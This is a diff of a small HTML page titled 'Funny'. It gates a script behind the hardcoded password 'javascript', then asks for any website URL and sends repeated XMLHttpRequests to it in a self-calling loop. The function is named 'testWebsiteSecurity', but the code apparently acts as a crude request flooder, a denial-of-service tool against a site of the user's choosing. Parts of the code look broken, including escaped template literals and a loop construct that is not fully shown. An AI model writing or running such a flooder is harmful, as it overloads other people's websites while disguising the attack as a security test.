@@ -1,17 +1,30 @@
 <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Funny</title>
-    </head>
-    <body>
-        <p>Password:</p>
-       <input type="text" id="password" name="username">
-        <button id="submit" onClick="mango()">Login</button>
-        
-        
+<html>
+<head>
+    <title>Funny</title>
+</head>
+<body>
+    <p>Password:</p>
+    <input type="text" id="password" name="username">
+    <button id="submit" onClick="mango()">Login</button>
+
 <script>
-const targetUrl = 'https://yourwebsite.com';
+let password = "";
+let targetUrl = 'https://yourwebsite.com';
 let iteration = 0;
+
+function mango() {
+    password = document.getElementById('password').value;
+    if (password === "javascript") {
+        const websiteUrl = prompt("Enter the website URL (without 'https://www.'):");
+        if (websiteUrl) {
+            targetUrl = 'https://www.' + websiteUrl;
+            testWebsiteSecurity();
+        }
+    } else {
+        alert("Incorrect password");
+    }
+}
 
 function testWebsiteSecurity() {
     const xhr = new XMLHttpRequest();
@@ -23,15 +36,11 @@ function testWebsiteSecurity() {
         while (password === "javascript") {
             testWebsiteSecurity();
             iteration ++;
-            document.title = (\`iteration: $\{iteration\}\`);
+            document.title = (\`iteration: $\{iteration}\`);
         }
     `);
     newLoop(iteration);
 }
-
-testWebsiteSecurity();
-
-            
 </script> <!-- Empty script tag -->
-    </body>
-    </html>
+</body>
+</html>
